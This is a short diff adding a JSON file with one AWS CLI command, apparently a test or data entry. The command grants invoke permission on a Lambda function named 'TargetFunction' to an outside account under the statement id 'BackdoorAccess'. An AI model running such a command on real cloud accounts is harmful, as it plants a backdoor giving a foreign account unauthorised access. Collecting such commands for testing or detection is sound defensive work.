@@ -1,0 +1,3 @@
+[
+  "aws lambda add-permission --function-name TargetFunction --statement-id BackdoorAccess --action lambda:InvokeFunction --principal 999888777666"
+]
